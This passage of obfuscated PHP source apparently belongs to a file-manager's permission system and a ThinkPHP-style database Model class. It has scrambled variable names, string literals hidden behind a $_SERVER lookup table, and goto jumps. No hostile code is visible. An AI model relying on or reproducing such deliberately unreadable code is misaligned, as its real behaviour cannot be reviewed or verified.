$ĞœøìäŒ . $¿ô­¬¬Ó[2069] . $ÕÑÒîÏÇ; static $öùçÅ÷ = array(); if (isset($öùçÅ÷[$«üïî„Ü])) { return $öùçÅ÷[$«üïî„Ü]; } $Íú¥©« = Model($¿ô­¬¬Ó[550])->getInfo($ÕÑÒîÏÇ); $•úŞ½‡Î = $this->userGroupList($ĞœøìäŒ); $ˆ«ĞÍ¾ç = isset($•úŞ½‡Î[$ÕÑÒîÏÇ]) ? $•úŞ½‡Î[$ÕÑÒîÏÇ][$¿ô­¬¬Ó[451]] : !1; if ($ˆ«ĞÍ¾ç && Model($¿ô­¬¬Ó[536])->authCheckAction($ˆ«ĞÍ¾ç[$¿ô­¬¬Ó[451]], $¿ô­¬¬Ó[1882])) { $öùçÅ÷[$«üïî„Ü] = $ˆ«ĞÍ¾ç; return $ˆ«ĞÍ¾ç; } $¡ˆèó‡— = $this->sourceAuthSelect($Íú¥©«[$¿ô­¬¬Ó[87]][$¿ô­¬¬Ó[440]]); $¦ØñÕ¯¹ = $¡ˆèó‡— ? $this->authMake($¡ˆèó‡—, $ĞœøìäŒ) : !1; $Ï¸–Å—´ = $¦ØñÕ¯¹ ? $¦ØñÕ¯¹[$¿ô­¬¬Ó[505]] : !1; $öùçÅ÷[$«üïî„Ü] = $Ï¸–Å—´ ? $Ï¸–Å—´ : $ˆ«ĞÍ¾ç; return $öùçÅ÷[$«üïî„Ü]; } public function authOwnerApply($¡¸„¹ÉŒ) { $ö®£Ù¦ =& $_SERVER[”ú…±Ú¥]; if (empty($¡¸„¹ÉŒ[$ö®£Ù¦[451]]) || isset($¡¸„¹ÉŒ[$ö®£Ù¦[2070]]) && $¡¸„¹ÉŒ[$ö®£Ù¦[2070]]) { return $¡¸„¹ÉŒ; } if (AuthModel::authCheckRoot($¡¸„¹ÉŒ[$ö®£Ù¦[451]][$ö®£Ù¦[452]])) { return $¡¸„¹ÉŒ; } $•äñá‰· = Model($ö®£Ù¦[1362])->parentLevelArray($¡¸„¹ÉŒ[$ö®£Ù¦[549]]); $•äñá‰· = array_merge(array($¡¸„¹ÉŒ[$ö®£Ù¦[440]]), array_reverse($•äñá‰·)); $¿â¾ßã = $this->sourceAuthSelect($•äñá‰·); $óÂËı° = array(); $¶—ı‹ = array(); foreach ($¿â¾ßã as $“Û•ø¬ => $“Ã„¡ãÔ) { $Œ“Õçò¶ = $this->authFolderOwnerUser($“Ã„¡ãÔ); $óÂËı°[$“Û•ø¬] = $Œ“Õçò¶; $¶—ı‹ = array_merge($¶—ı‹, $Œ“Õçò¶[$ö®£Ù¦[628]]); if ($Œ“Õçò¶[$ö®£Ù¦[2071]]) { break; } } if (count($¶—ı‹) == 0) { $¶—ı‹ = $this->authFolderOwnerGroup($¡¸„¹ÉŒ[$ö®£Ù¦[534]]); } $¶—ı‹ = array_unique($¶—ı‹); if (AuthModel::authCheckRoot($¡¸„¹ÉŒ[$ö®£Ù¦[451]][$ö®£Ù¦[452]])) { $¶—ı‹[] = USER_ID; } $¡¸„¹ÉŒ[$ö®£Ù¦[451]][$ö®£Ù¦[2072]] = Model($ö®£Ù¦[542])->userListInfo($¶—ı‹); return $¡¸„¹ÉŒ; } private function authFolderOwnerGroup($¨İûôªÈ) { $ˆÈññÌ =& $_SERVER[”ú…±Ú¥]; $¤‘Öâ´¤ = Model($ˆÈññÌ[1951])->where(array($ˆÈññÌ[1861] => $¨İûôªÈ))->select(); $§Óø•È½ = array(); if (!$¤‘Öâ´¤) { return $§Óø•È½; } foreach ($¤‘Öâ´¤ as $§™Ó³Ï—) { $ì­Êìšø = $this->authInfo($§™Ó³Ï—); if (AuthModel::authCheckRoot($ì­Êìšø[$ˆÈññÌ[451]])) { $§Óø•È½[] = $§™Ó³Ï—[$ˆÈññÌ[1671]]; } } return $§Óø•È½; } private function authFolderOwnerUser($Éî”¤ìŒ) { $É¦½Şµ =& $_SERVER[”ú…±Ú¥]; $ĞÑ È½Ó = array(); $†Ò¶·ç× = !1; foreach ($Éî”¤ìŒ as $™Û×·Ë¨) { $§Ú›”Í = $this->authInfo($™Û×·Ë¨); if ($™Û×·Ë¨[$É¦½Şµ[534]] == $É¦½Şµ[208]) { $†Ò¶·ç× = !0; } if ($™Û×·Ë¨[$É¦½Şµ[449]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($§Ú›”Í[$É¦½Şµ[451]])) { $ĞÑ È½Ó[] = $™Û×·Ë¨[$É¦½Şµ[534]]; } } } return array($É¦½Şµ[628] => $ĞÑ È½Ó, $É¦½Şµ[2071] => $†Ò¶·ç×); } public function authMake($†¤£Æ’æ, $ç©‰¢Üõ = false) { $šã±ÆİÇ =& $_SERVER[”ú…±Ú¥]; $¿ ø¦Öï = $this->authArrayCheck($†¤£Æ’æ, $ç©‰¢Üõ); if ($¿ ø¦Öï[$šã±ÆİÇ[2073]]) { $¿ ø¦Öï[$šã±ÆİÇ[2073]] = $this->sourceAuthInfo($¿ ø¦Öï[$šã±ÆİÇ[2073]]); } return $¿ ø¦Öï; } public function authArrayCheck($Ùµ†¢Ç×, $›à•·Ú = false) { $­Ïµà‘ö =& $_SERVER[”ú…±Ú¥]; if (!$Ùµ†¢Ç×) { return array($­Ïµà‘ö[452] => 0, $­Ïµà‘ö[505] => !1); } $›à•·Ú = $›à•·Ú ? $›à•·Ú : USER_ID; $“°öÔ = 0; $Š“ëı½Â = 0; $âøíèœ¶ = 0; $±×„¤ÒÌ = 0; $Ò¡Ä Üé = 0; $úŒ¬÷ñã = 0; $Ñó¬œéù = 1000; $¯ÒÒ³¸Ö = 0; $ˆ‘ÓÇ¹Ğ = 0; $¬ØÛ’ô« = 0; $ç¡Ùø¢ = 0; $ğÛâ”æ = array($­Ïµà‘ö[440] => 0); foreach ($Ùµ†¢Ç× as $ğÛâ”æ) { $»œ„¤Ö = $this->authInfo($ğÛâ”æ); if (!$»œ„¤Ö) { continue; } $ŒÂ£óš = $ğÛâ”æ[$­Ïµà‘ö[534]]; $ş†ğûì = intval($»œ„¤Ö[$­Ïµà‘ö[451]]); if ($ğÛâ”æ[$­Ïµà‘ö[449]] == SourceModel::TYPE_USER && $ŒÂ£óš == $›à•·Ú) { $“°öÔ = !0; $âøíèœ¶ = $»œ„¤Ö; $Š“ëı½Â = $ş†ğûì; } else { if ($ğÛâ”æ[$­Ïµà‘ö[449]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ŒÂ£óš, $›à•·Ú)) { $±×„¤ÒÌ = !0; $¨å×Ã¿Ú = $this->groupStepToUserGroup($ŒÂ£óš, $›à•·Ú); if ($¨å×Ã¿Ú < $Ñó¬œéù) { $Ñó¬œéù = $¨å×Ã¿Ú; $Ò¡Ä Üé = $ş†ğûì; $úŒ¬÷ñã = $»œ„¤Ö; $¯ÒÒ³¸Ö = $ŒÂ£óš; } if ($¨å×Ã¿Ú == $Ñó¬œéù && $ş†ğûì >= $Ò¡Ä Üé) { $Ò¡Ä Üé = $ş†ğûì; $úŒ¬÷ñã = $»œ„¤Ö; $¯ÒÒ³¸Ö = $ŒÂ£óš; } } else { if ($ŒÂ£óš == $­Ïµà‘ö[208]) { $ˆ‘ÓÇ¹Ğ = !0; $ç¡Ùø¢ = $»œ„¤Ö; $¬ØÛ’ô« = $ş†ğûì; } } } } if ($“°öÔ) { $Öğ”™Ø’ = $Š“ëı½Â; $»œ„¤Ö = $âøíèœ¶; $ç®Êûª‹ = LNG($­Ïµà‘ö[2074]); } else { if ($±×„¤ÒÌ) { $Öğ”™Ø’ = $Ò¡Ä Üé; $»œ„¤Ö = $úŒ¬÷ñã; $¾†Ì‡›« = Model($­Ïµà‘ö[550])->getInfo($¯ÒÒ³¸Ö); $ç®Êûª‹ = $­Ïµà‘ö[162] . $¾†Ì‡›«[$­Ïµà‘ö[554]] . $­Ïµà‘ö[2075] . LNG($­Ïµà‘ö[2076]); } else { if ($ˆ‘ÓÇ¹Ğ) { $Öğ”™Ø’ = $¬ØÛ’ô«; $»œ„¤Ö = $ç¡Ùø¢; $ç®Êûª‹ = LNG($­Ïµà‘ö[2047]); } else { $Öğ”™Ø’ = 0; $»œ„¤Ö = !1; $ç®Êûª‹ = $­Ïµà‘ö[12]; } } } $‚ŠıÂ­ø = array($­Ïµà‘ö[2066] => intval($Öğ”™Ø’), $­Ïµà‘ö[2050] => $»œ„¤Ö, $­Ïµà‘ö[2067] => $ç®Êûª‹, $­Ïµà‘ö[2059] => $ğÛâ”æ[$­Ïµà‘ö[440]]); return $‚ŠıÂ­ø; } private function groupContainUser($ÛşÙ¿¨Í, $×ºàçÆ = false) { return in_array($ÛşÙ¿¨Í, $this->userGroupParents($×ºàçÆ)); } private function groupStepToUserGroup($¨Š¤è®¸, $Ò³ğ­™‡ = false) { $â¯ÄŸÕè =& $_SERVER[”ú…±Ú¥]; $ÇÁÛæ¿º = $this->userGroupList($Ò³ğ­™‡); $™öé¥Ø” = 1000; $¥Õû¶©« = $GLOBALS[$â¯ÄŸÕè[6]][$â¯ÄŸÕè[89]][$â¯ÄŸÕè[1964]] == 1; $ ¦—Ó”» = $¥Õû¶©« ? 3 : 2; foreach ($ÇÁÛæ¿º as $®ÌÔÌÃª) { if ($®ÌÔÌÃª[$â¯ÄŸÕè[1861]] == $¨Š¤è®¸) { return 0; } $¤ˆ…«½¥ = explode($â¯ÄŸÕè[50], trim($®ÌÔÌÃª[$â¯ÄŸÕè[549]], $â¯ÄŸÕè[50])); if ($¤ˆ…«½¥[0] == $â¯ÄŸÕè[208] && count($¤ˆ…«½¥) > $ ¦—Ó”») { $ÂòáÑâ÷ = array_reverse(array_slice($¤ˆ…«½¥, $ ¦—Ó”»)); $õÚ’ ˆ = array_search($¨Š¤è®¸, $ÂòáÑâ÷); if ($õÚ’ ˆ !== !1 && $õÚ’ ˆ + 1 <= $™öé¥Ø”) { $™öé¥Ø” = $õÚ’ ˆ + 1; } } } return $™öé¥Ø”; } private function userGroupList($ÌŸ¨£Ê± = false) { $û±¬¾å =& $_SERVER[”ú…±Ú¥]; static $ÎÒÎ‘”î = array(); if (isset($ÎÒÎ‘”î[$ÌŸ¨£Ê±])) { return $ÎÒÎ‘”î[$ÌŸ¨£Ê±]; } $Øî‹òı— = Model($û±¬¾å[563])->getInfo($ÌŸ¨£Ê±); $ÎÒÎ‘”î[$ÌŸ¨£Ê±] = array_to_keyvalue($Øî‹òı—[$û±¬¾å[2048]], $û±¬¾å[1861]); return $ÎÒÎ‘”î[$ÌŸ¨£Ê±]; } public function userGroupParents($ÎÔø¼´€) { $„…Ïüô =& $_SERVER[”ú…±Ú¥]; static $¢‹Ÿú…ƒ = array(); $ÎÔø¼´€ = $ÎÔø¼´€ ? $ÎÔø¼´€ : USER_ID; if (isset($¢‹Ÿú…ƒ[$ÎÔø¼´€])) { return $¢‹Ÿú…ƒ[$ÎÔø¼´€]; } $´Ø—Õ™ = $this->userGroupList($ÎÔø¼´€); $îÒæÀÙ™ = array(); $Î«Ÿñù = $GLOBALS[$„…Ïüô[6]][$„…Ïüô[89]][$„…Ïüô[1964]] == 1; $éı½·¬ = $Î«Ÿñù ? 3 : 2; foreach ($´Ø—Õ™ as $®ò½“›) { $‹à£òò = array($®ò½“›[$„…Ïüô[1861]]); $›ºš£ğš = explode($„…Ïüô[50], trim($®ò½“›[$„…Ïüô[549]], $„…Ïüô[50])); if ($›ºš£ğš[0] == $„…Ïüô[208] && count($›ºš£ğš) > $éı½·¬) { $—„‡áµ = array_slice($›ºš£ğš, $éı½·¬); $‹à£òò = array_merge($‹à£òò, array_reverse($—„‡áµ)); } $îÒæÀÙ™ = array_merge($îÒæÀÙ™, $‹à£òò); } $¢‹Ÿú…ƒ[$ÎÔø¼´€] = array_unique($îÒæÀÙ™); return $¢‹Ÿú…ƒ[$ÎÔø¼´€]; } public function authTargetInfoMake($ëŒé‘£ö) { $› Ô×»Ö =& $_SERVER[”ú…±Ú¥]; $ÛÖ¹‰‰½ = array(); $ÕÀÇ„ü¾ = array(); foreach ($ëŒé‘£ö as $ƒÁ™œîğ) { if ($ƒÁ™œîğ[$› Ô×»Ö[449]] == SourceModel::TYPE_USER) { $ÛÖ¹‰‰½[] = intval($ƒÁ™œîğ[$› Ô×»Ö[534]]); } else { if ($ƒÁ™œîğ[$› Ô×»Ö[449]] == SourceModel::TYPE_GROUP) { $ÕÀÇ„ü¾[] = intval($ƒÁ™œîğ[$› Ô×»Ö[534]]); } } } if ($ÛÖ¹‰‰½) { $ÛÖ¹‰‰½ = Model($› Ô×»Ö[542])->userListInfo($ÛÖ¹‰‰½); } if ($ÕÀÇ„ü¾) { $é–‰ª²Ü = array($› Ô×»Ö[1949] => array($› Ô×»Ö[456], $ÕÀÇ„ü¾)); $ÕÀÇ„ü¾ = Model($› Ô×»Ö[550])->field($› Ô×»Ö[2077])->where($é–‰ª²Ü)->select(); $ÕÀÇ„ü¾ = array_to_keyvalue($ÕÀÇ„ü¾, $› Ô×»Ö[1861]); } return array($› Ô×»Ö[2078] => $ÛÖ¹‰‰½, $› Ô×»Ö[2079] => $ÕÀÇ„ü¾); } public function authInfo($Öçê¨ù´) { $Òëµ®ˆâ =& $_SERVER[”ú…±Ú¥]; if ($Öçê¨ù´[$Òëµ®ˆâ[1965]]) { $¿×½¶Æ = Model($Òëµ®ˆâ[536])->listData($Öçê¨ù´[$Òëµ®ˆâ[1965]]); if (!$¿×½¶Æ) { return !1; $ê˜Èƒ = Model($Òëµ®ˆâ[536])->listData(); $à£ùšæĞ = array_filter_by_field($ê˜Èƒ, $Òëµ®ˆâ[451], $Òëµ®ˆâ[208]); return $à£ùšæĞ; } $ñº•¢Øî = array_field_key($¿×½¶Æ, array($Òëµ®ˆâ[437], $Òëµ®ˆâ[32], $Òëµ®ˆâ[451], $Òëµ®ˆâ[1884], $Òëµ®ˆâ[1885])); $ñº•¢Øî[$Òëµ®ˆâ[2080]] = $Öçê¨ù´; return $ñº•¢Øî; } else { return array($Òëµ®ˆâ[457] => 0, $Òëµ®ˆâ[1867] => $Öçê¨ù´[$Òëµ®ˆâ[2025]], $Òëµ®ˆâ[458] => $Òëµ®ˆâ[12], $Òëµ®ˆâ[1884] => $Òëµ®ˆâ[2081]); } } } goto EÖ×ÊÅğŠ; fİ²­Š¹õ: define($_SERVER[”ú…±Ú¥][281], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\162\x64\145\x72", "\141\x6c\x69\x61\x73", "\x68\x61\166\151\x6e\x67", "\147\162\157\165\x70", "\x6c\x6f\143\x6b", "\x64\x69\x73\x74\151\x6e\x63\164", "\141\x75\164\157", "\x66\x69\x6c\x74\145\x72", "\x76\x61\x6c\x69\x64\141\164\145", "\162\x65\x73\x75\154\x74", "\142\151\x6e\x64", "\164\157\x6b\145\156"); public function __construct($óÑâ‹ë¿ = '', $˜’Öç¹á = '', $±Ã£Âõê = '') { $òĞ¿ìœÄ =& $_SERVER[”ú…±Ú¥]; $this->_initialize(); if (!empty($óÑâ‹ë¿)) { if (strpos($óÑâ‹ë¿, $òĞ¿ìœÄ[10])) { list($this->dbName, $this->name) = explode($òĞ¿ìœÄ[10], $óÑâ‹ë¿); } else { $this->name = $óÑâ‹ë¿; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($˜’Öç¹á)) { $this->tablePrefix = $òĞ¿ìœÄ[12]; } elseif ($òĞ¿ìœÄ[12] != $˜’Öç¹á) { $this->tablePrefix = $˜’Öç¹á; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($òĞ¿ìœÄ[282]); } $this->db(0, empty($this->connection) ? $±Ã£Âõê : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $æ¢„ÊŸ =& $_SERVER[”ú…±Ú¥]; if (empty($this->fields)) { if (think_config($æ¢„ÊŸ[283])) { $ë¢Š÷„… = $this->dbName ? $this->dbName : think_config($æ¢„ÊŸ[284]); $Îôòå÷ = think_var_cache($æ¢„ÊŸ[285] . strtolower(get_path_this($ë¢Š÷„…) . $æ¢„ÊŸ[10] . $this->name)); if ($Îôòå÷) { $¥œ’á² = think_config($æ¢„ÊŸ[286]); if (empty($¥œ’á²) || $Îôòå÷[$æ¢„ÊŸ[287]] == $¥œ’á²) { $this->fields = $Îôòå÷; return; } } } $this->flush(); } } public function flush() { $¼ü¬ƒ± =& $_SERVER[”ú…±Ú¥]; $this->db->setModel($this->name); $ÕÕ àˆ = $this->db->getFields($this->getTableName()); if (!$ÕÕ àˆ) { return !1; } $this->fields = array_keys($ÕÕ àˆ); $this->fields[$¼ü¬ƒ±[288]] = !1; foreach ($ÕÕ àˆ as $›¼€š => $ÀÄ‘›Ì) { $åï­çÁ[$›¼€š] = $ÀÄ‘›Ì[$¼ü¬ƒ±[33]]; if ($ÀÄ‘›Ì[$¼ü¬ƒ±[39]]) { $this->fields[$¼ü¬ƒ±[289]] = $›¼€š; if ($ÀÄ‘›Ì[$¼ü¬ƒ±[42]]) { $this->fields[$¼ü¬ƒ±[288]] = !0; } } } $this->fields[$¼ü¬ƒ±[290]] = $åï­çÁ; if (think_config($¼ü¬ƒ±[286])) { $this->fields[$¼ü¬ƒ±[287]] = think_config($¼ü¬ƒ±[286]); } if (think_config($¼ü¬ƒ±[283])) { $À½Š€¼ = $this->dbName ? $this->dbName : think_config($¼ü¬ƒ±[284]); think_var_cache($¼ü¬ƒ±[285] . strtolower(get_path_this($À½Š€¼) . $¼ü¬ƒ±[10] . $this->name), $this->fields); } } public function switchModel($æŸ”ÄØ¤, $ùª»Ï»‘ = array()) { $•ÑÓëÛã =& $_SERVER[”ú…±Ú¥]; $Š›ÆúÙ = ucwords(strtolower($æŸ”ÄØ¤)) . $•ÑÓëÛã[291]; if (!class_exists($Š›ÆúÙ)) { think_exception($Š›ÆúÙ . think_lang($•ÑÓëÛã[292])); } $this->_extModel = new $Š›ÆúÙ($this->name); if (!empty($ùª»Ï»‘)) { foreach ($ùª»Ï»‘ as $àí—ìñ¦) { $this->_extModel->setProperty($àí—ìñ¦, $this->{$àí—ìñ¦}); } } return $this->_extModel; } public function __set($ğãäé€, $æ¾µÙç) { $this->data[$ğãäé€] = $æ¾µÙç; } public function __get($ŸˆÇØ¢İ) { return isset($this->data[$ŸˆÇØ¢İ]) ? $this->data[$ŸˆÇØ¢İ] : null; } public function __isset($È‰­›’ò) { return isset($this->data[$È‰­›’ò]); } public function __unset($ØÈõŞ·’) { unset($this->data[$ØÈõŞ·’]); } public function __call($ÀÓ¡¾ŒÅ, $ÇÑø»Î) { $˜üáƒ­ =& $_SERVER[”ú…±Ú¥]; if (in_array(strtolower($ÀÓ¡¾ŒÅ), $this->methods, !0)) { $this->options[strtolower($ÀÓ¡¾ŒÅ)] = $ÇÑø»Î[0]; return $this; } elseif (in_array(strtolower($ÀÓ¡¾ŒÅ), array($˜üáƒ­[293], $˜üáƒ­[294], $˜üáƒ­[295], $˜üáƒ­[296], $˜üáƒ­[297]), !0)) { $øó„ß¼Ó = isset($ÇÑø»Î[0]) ? $ÇÑø»Î[0] : $˜üáƒ­[199]; $øó„ß¼Ó = $this->db->parseKey($øó„ß¼Ó); return $this->getField(strtoupper($ÀÓ¡¾ŒÅ) . $˜üáƒ­[298] . $øó„ß¼Ó . $˜üáƒ­[299] . $ÀÓ¡¾ŒÅ, $˜üáƒ­[293]); } elseif (strtolower(substr($ÀÓ¡¾ŒÅ, 0, 5)) == $˜üáƒ­[300]) { $øó„ß¼Ó = think_parse_name(substr($ÀÓ¡¾ŒÅ, 5)); $ÛÙèåÔ„[$øó„ß¼Ó] = $ÇÑø»Î[0]; return $this->where($ÛÙèåÔ„)->find(); } elseif (strtolower(substr($ÀÓ¡¾ŒÅ, 0, 10)) == $˜üáƒ­[301]) { $ïï•ö¤¡ = think_parse_name(substr($ÀÓ¡¾ŒÅ, 10)); $ÛÙèåÔ„[$ïï•ö¤¡] = $ÇÑø»Î[0]; return $this->where($ÛÙèåÔ„)->getField($ÇÑø»Î[1]); } elseif (isset($this->_scope[$ÀÓ¡¾ŒÅ])) { return $this->scope($ÀÓ¡¾ŒÅ, $ÇÑø»Î[0]); } elseif (method_exists($this, $ÀÓ¡¾ŒÅ)) { array_unshift($ÇÑø»Î, $ÀÓ¡¾ŒÅ); return call_user_func_array(array($this, $˜üáƒ­[302]), $ÇÑø»Î); } else { return call_user_func_array(array(parent, $ÀÓ¡¾ŒÅ), $ÇÑø»Î); } } protected function call() { $€­âÄı“ =& $_SERVER[”ú…±Ú¥]; $Øéîª¡Ì = func_get_args(); $”ùëßÃî = array_shift($Øéîª¡Ì); $·–ôğ™ = $”ùëßÃî; if (is_array($”ùëßÃî)) { $·–ôğ™ = $”ùëßÃî[1]; $”ùëßÃî = $”ùëßÃî[0]; } $ºæ×¹§” = count($Øéîª¡Ì) - 1; if (isset($Øéîª¡Ì[$ºæ×¹§”]) && $Øéîª¡Ì[$ºæ×¹§”] === $”ùëßÃî) { think_exception(__CLASS__ . $€­âÄı“[4] . $”ùëßÃî . think_lang($€­âÄı“[303])); return; } $Øéîª¡Ì[] = $”ùëßÃî; if (method_exists($this, $€­âÄı“[304])) { $Šğª”›Ø = call_user_func_array(array($this, $€­âÄı“[305]), array($·–ôğ™, $Øéîª¡Ì)); if (!is_null($Šğª”›Ø) && $Šğª”›Ø !== !1) { return $Šğª”›Ø; } } $º‚Ÿ™§¿ = call_user_func_array(array($this, $”ùëßÃî), $Øéîª¡Ì); if (method_exists($this, $€­âÄı“[306])) { $Šğª”›Ø = call_user_func_array(array($this, $€­âÄı“[307]), array($·–ôğ™, $Øéîª¡Ì, $º‚Ÿ™§¿)); if ($Šğª”›Ø) { return $Šğª”›Ø; } } return $º‚Ÿ™§¿; } protected function _initialize() { } protected function _facade($¶–Î“Ñ¾) { $Æëõ‚³Ò =& $_SERVER[”ú…±Ú¥]; if (!empty($this->fields)) { foreach ($¶–Î“Ñ¾ as $™ç„¹†™ => $ó…º¦»è) { if (is_array($this->fields) && !in_array($™ç„¹†™, $this->fields, !0)) { unset($¶–Î“Ñ¾[$™ç„¹†™]); } elseif (is_scalar($ó…º¦»è)) { $this->_parseType($¶–Î“Ñ¾, $™ç„¹†™); } } } if (!empty($this->options[$Æëõ‚³Ò[308]])) { $¶–Î“Ñ¾ = array_map($this->options[$Æëõ‚³Ò[308]], $¶–Î“Ñ¾); unset($this->options[$Æëõ‚³Ò[308]]); } $this->_beforeWrite($¶–Î“Ñ¾); return $¶–Î“Ñ¾; } protected function _beforeWrite(&$ëî¬ØÀ) { } public function add($İœ„Á¯ı = '', $›–ıéªÂ = array(), $œöÆ¥ó = false) { if (empty($İœ„Á¯ı)) { if (!empty($this->data)) { $İœ„Á¯ı = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[”ú…±Ú¥][309]); return !1; } } $›–ıéªÂ = $this->_parseOptions($›–ıéªÂ); $İœ„Á¯ı = $this->_facade($İœ„Á¯ı); if (!1 === $this->_beforeInsert($İœ„Á¯ı, $›–ıéªÂ)) { return !1; } $ÎüßØœË = $this->db->insert($İœ„Á¯ı, $›–ıéªÂ, $œöÆ¥ó); if (!1 !== $ÎüßØœË) { $ïíÏæ½ = $this->getLastInsID(); if ($ïíÏæ½) { $İœ„Á¯ı[$this->getPk()] = $ïíÏæ½; $this->_after_insert($İœ„Á¯ı, $›–ıéªÂ); return $ïíÏæ½; } $this->_after_insert($İœ„Á¯ı, $›–ıéªÂ); } return $ÎüßØœË; } protected function _beforeInsert(&$ç©š·û, $³Ï—İ‘ë) { } protected function _after_insert($¨à«âç—, $ò’×Ï¯ü) { } public function addAll($ŞÌˆó…, $ãÚù¦ÙÒ = array(), $­ ×¹¾® = false) { $¨¼˜ğã¥ =& $_SERVER[”ú…±Ú¥]; if (empty($ŞÌˆó…)) { $this->error = think_lang($¨¼˜ğã¥[309]); return !1; } $ãÚù¦ÙÒ = $this->_parseOptions($ãÚù¦ÙÒ); foreach ($ŞÌˆó… as $«àÊè¼‘ => $–®ğ’öÉ) { $ŞÌˆó…[$«àÊè¼‘] = $this->_facade($–®ğ’öÉ); } if (method_exists($this->db, $¨¼˜ğã¥[310])) { $Ñ£şß = $this->db->insertAll($ŞÌˆó…, $ãÚù¦ÙÒ, $­ ×¹¾®); } else { $this->startTrans(); foreach ($ŞÌˆó… as $«àÊè¼‘ => $–®ğ’öÉ) { $Ñ£şß = $this->db->insert($–®ğ’öÉ, $ãÚù¦ÙÒ, $­ ×¹¾®); } $this->commit(); } if (!1 !== $Ñ£şß) { $™á£Æè = $this->getLastInsID(); if ($™á£Æè) { return $™á£Æè; } } return $Ñ£şß; } public function selectAdd($òäü€àß = '', $­ÊÀ¼Èê = '', $Ç†æŒÄ× = array()) { $…ÈîˆÃ =& $_SERVER[”ú…±Ú¥]; $Ç†æŒÄ× = $this->_parseOptions($Ç†æŒÄ×); if (!1 === ($Ÿ´ğ¤…º = $this->db->selectInsert($òäü€àß ? $òäü€àß : $Ç†æŒÄ×[$…ÈîˆÃ[311]], $­ÊÀ¼Èê ? $­ÊÀ¼Èê : $this->getTableName(), $Ç†æŒÄ×))) { $this->error = think_lang($…ÈîˆÃ[312]); return !1; } else { return $Ÿ´ğ¤…º; } } public function save($¿ÍÊ‘¯Ê = '', $”Í“–½á = array()) { $¼ò¡‚¬ı =& $_SERVER[”ú…±Ú¥]; if (empty($¿ÍÊ‘¯Ê)) { if (!empty($this->data)) { $¿ÍÊ‘¯Ê = $this->data; $this->data = array(); } else { $this->error = think_lang($¼ò¡‚¬ı[309]); return !1; } } $¿ÍÊ‘¯Ê = $this->_facade($¿ÍÊ‘¯Ê); $”Í“–½á = $this->_parseOptions($”Í“–½á); $ŞˆÓ£™ = $this->getPk(); if (!isset($”Í“–½á[$¼ò¡‚¬ı[313]])) { if (isset($¿ÍÊ‘¯Ê[$ŞˆÓ£™])) { $İ›åêõğ[$ŞˆÓ£™] = $¿ÍÊ‘¯Ê[$ŞˆÓ£™]; $”Í“–½á[$¼ò¡‚¬ı[313]] = $İ›åêõğ; unset($¿ÍÊ‘¯Ê[$ŞˆÓ£™]); } else { $this->error = think_lang($¼ò¡‚¬ı[312]); return !1; } } if (is_array($”Í“–½á[$¼ò¡‚¬ı[313]]) && isset($”Í“–½á[$¼ò¡‚¬ı[313]][$ŞˆÓ£™])) { $ÇàßÑÆü = $”Í“–½á[$¼ò¡‚¬ı[313]][$ŞˆÓ£™]; } if (!1 === $this->_beforeUpdate($¿ÍÊ‘¯Ê, $”Í“–½á)) { return !1; } $ÊÎäşä = $this->db->update($¿ÍÊ‘¯Ê, $”Í“–½á); if (!1 !== $ÊÎäşä) { if (isset($ÇàßÑÆü)) { $¿ÍÊ‘¯Ê[$ŞˆÓ£™] = $ÇàßÑÆü; } $this->_afterUpdate($¿ÍÊ‘¯Ê, $”Í“–½á); } return $ÊÎäşä; } protected function _beforeUpdate(&$›ÉÇ›ò, $ªğÖÂ“²) { } protected function _afterUpdate($¬ñáç¢, $¯ò ì‹) { } public function delete($õè†ßÅ = array()) { $éÍ²ÇÖô =& $_SERVER[”ú…±Ú¥]; if (empty($õè†ßÅ) && empty($this->options[$éÍ²ÇÖô[313]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ºÄ‡İ£õ = $this->getPk(); if (is_numeric($õè†ßÅ) || is_string($õè†ßÅ)) { if (strpos($õè†ßÅ, $éÍ²ÇÖô[50])) { $¼ƒù’Ù¥[$ºÄ‡İ£õ] = array($éÍ²ÇÖô[314], $õè†ßÅ); } else { $¼ƒù’Ù¥[$ºÄ‡İ£õ] = $õè†ßÅ; } $this->options[$éÍ²ÇÖô[313]] = $¼ƒù’Ù¥; } $õè†ßÅ = $this->_parseOptions(); if (is_array($õè†ßÅ[$éÍ²ÇÖô[313]]) && isset($õè†ßÅ[$éÍ²ÇÖô[313]][$ºÄ‡İ£õ])) { $ÛÑÜáŠ‡ = $õè†ßÅ[$éÍ²ÇÖô[313]][$ºÄ‡İ£õ]; } $¸òÄÊ¡Ì = $this->db->delete($õè†ßÅ); if (!1 !== $¸òÄÊ¡Ì) { $Œñ”ğšõ = array(); if (isset($ÛÑÜáŠ‡)) { $Œñ”ğšõ[$ºÄ‡İ£õ] = $ÛÑÜáŠ‡; } $this->_after_delete($Œñ”ğšõ, $õè†ßÅ); } return $¸òÄÊ¡Ì; } protected function _after_delete($‘¼ãëô», $çüñ Õí) { } public function select($àÇªƒıõ = array()) { $Ì€¦±„• =& $_SERVER[”ú…±Ú¥]; if (is_string($àÇªƒıõ) || is_numeric($àÇªƒıõ)) { $Ä¡úÒ½İ = $this->getPk(); if (strpos($àÇªƒıõ, $Ì€¦±„•[50])) { $û‹¦ĞÀø[$Ä¡úÒ½İ] = array($Ì€¦±„•[314], $àÇªƒıõ); } else { $û‹¦ĞÀø[$Ä¡úÒ½İ] = $àÇªƒıõ; } $this->options[$Ì€¦±„•[313]] = $û‹¦ĞÀø; } elseif (!1 === $àÇªƒıõ) { $àÇªƒıõ = $this->_parseOptions(); return $Ì€¦±„•[315] . $this->db->buildSelectSql($àÇªƒıõ) . $Ì€¦±„•[316]; } $àÇªƒıõ = $this->_parseOptions(); $—úö¹¢ª = $this->db->select($àÇªƒıõ); if (!1 === $—úö¹¢ª) { return !1; } if (empty($—úö¹¢ª)) 